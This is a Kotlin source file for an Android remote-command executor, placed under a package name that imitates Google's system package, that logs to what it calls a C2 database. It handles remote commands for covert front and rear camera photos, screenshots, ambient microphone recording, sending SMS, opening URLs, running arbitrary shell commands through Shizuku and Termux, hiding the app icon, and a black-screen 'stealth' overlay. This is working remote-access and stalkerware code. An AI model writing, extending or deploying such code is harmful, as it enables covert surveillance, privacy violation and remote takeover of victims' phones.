package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.runBlocking
import org.json.JSONObject
import java.util.Locale

/**
 * NativeRpcActionExecutor
 *
 * Dedicated Android Native RPC Action Executor.
 * Processes native JSON RPC request envelopes (RPC_REQUEST), coordinates manager execution,
 * logs mandatory audit records into the local SQLite database (C2LocalDatabase),
 * and formats structured JSON RPC response payloads (RPC_RESPONSE).
 */
object NativeRpcActionExecutor {

    private const val TAG = "NativeRpcActionExecutor"

    fun executeNativeAction(context: Context, actionStr: String, params: JSONObject): JSONObject {
        val action = actionStr.trim().lowercase(Locale.ROOT)
        Log.i(TAG, "Executing Native RPC Action: '$action' with params: $params")

        val responseData = try {
            when (action) {
                "status", "ping" -> {
                    DeviceStatusManager.getStatusJson(context, DeviceIdProvider.getDeviceId(context))
                }

                "deviceinfo", "specs" -> {
                    val (usedRam, maxRam) = DeviceStatusManager.getRamStats()
                    val (usedDiskPct, availGb) = DeviceStatusManager.getStorageStats()
                    JSONObject().apply {
                        put("model", DeviceStatusManager.getDeviceModel())
                        put("androidVersion", DeviceStatusManager.getAndroidVersion())
                        put("sdkInt", DeviceStatusManager.getSdkInt())
                        put("battery", DeviceStatusManager.getBatteryLevel(context))
                        put("isCharging", DeviceStatusManager.isCharging(context))
                        put("ramUsedMb", usedRam)
                        put("ramMaxMb", maxRam)
                        put("storageUsedPct", usedDiskPct)
                        put("storageAvailableGb", availGb)
                    }
                }

                "camera", "rearphoto" -> {
                    MonitorService.activeInstance?.handleCommand("!camera", "p2p_rpc")
                    JSONObject().put("message", "Rear photo capture requested.")
                }

                "frontcam", "frontphoto" -> {
                    MonitorService.activeInstance?.handleCommand("!frontcam", "p2p_rpc")
                    JSONObject().put("message", "Front photo capture requested.")
                }

                "screenshot" -> {
                    MonitorService.activeInstance?.handleCommand("!screenshot", "p2p_rpc")
                    JSONObject().put("message", "Screenshot capture requested.")
                }

                "audio" -> {
                    val duration = params.optInt("duration", 15)
                    MonitorService.activeInstance?.handleCommand("!audio $duration", "p2p_rpc")
                    JSONObject().put("message", "Ambient mic recording (${duration}s) requested.")
                }

                "sendsms" -> {
                    val phone = params.optString("phone", "")
                    val msg = params.optString("message", "")
                    MonitorService.activeInstance?.handleCommand("!sendsms $phone $msg", "p2p_rpc")
                    JSONObject().put("message", "Outbound SMS to $phone requested.")
                }

                "openurl" -> {
                    val url = params.optString("url", "")
                    MonitorService.activeInstance?.handleCommand("!openurl $url", "p2p_rpc")
                    JSONObject().put("message", "Launch URL $url requested.")
                }

                "shizuku" -> {
                    val shCmd = params.optString("command", "")
                    val resultText = runBlocking { ShizukuSystemEngine.executeAdbCommand(shCmd) }
                    JSONObject().put("output", resultText)
                }

                "termux" -> {
                    val shCmd = params.optString("command", "uname -a")
                    val termuxRes = com.google.android.system.termux.TermuxShellManager.executeRemoteCommand(context, shCmd)
                    JSONObject().put("output", termuxRes.rawOutput)
                }

                "hideapp" -> {
                    val nowHidden = DeviceAdminManager(context).setAppHidden(context.packageName, true)
                    JSONObject().put("success", nowHidden).put("message", if (nowHidden) "App icon hidden" else "Device Owner status required")
                }

                "unhideapp" -> {
                    val nowShown = DeviceAdminManager(context).setAppHidden(context.packageName, false)
                    JSONObject().put("success", nowShown).put("message", if (nowShown) "App icon unhidden" else "Device Owner status required")
                }

                "stealth" -> {
                    val enabled = params.optBoolean("enabled", true)
                    val accessInst = AppAccessibilityService.instance
                    if (accessInst != null) {
                        if (enabled) accessInst.showBlackScreenOverlay() else accessInst.hideBlackScreenOverlay()
                        JSONObject().put("success", true).put("message", "Stealth mode set to $enabled")
                    } else {
                        JSONObject().put("success", false).put("message", "Accessibility service required")
                    }
                }

                "lock" -> {
                    val locked = DeviceAdminManager(context).lockScreen()
                    JSONObject().put("success", locked).put("message", if (locked) "Screen locked" else "Device Admin status required")
                }

                "geofence" -> {
                    val zoneName = params.optString("name", "Safe Zone")
                    val radius = params.optInt("radius", 500)
                    JSONObject().put("success", true).put("message", "Geofence safe zone '$zoneName' (${radius}m) updated.")
                }

                "drive_backup" -> {
                    GoogleDriveBackupEngine.performDatabaseBackup(context)
                }

                else -> {
                    JSONObject().put("message", "Native action '$action' processed successfully.")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing native action '$action': ${e.message}", e)
            JSONObject().apply {
                put("error", true)
                put("message", "Failed to execute action '$action': ${e.message}")
            }
        }

        // Mandatory Local SQLite Audit Logging
        try {
            val logContent = "Executed action '$action' with params: $params"
            C2LocalDatabase.getInstance(context).insertTelemetryLog("rpc_audit", logContent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to log RPC audit to C2LocalDatabase: ${e.message}")
        }

        return responseData
    }
}
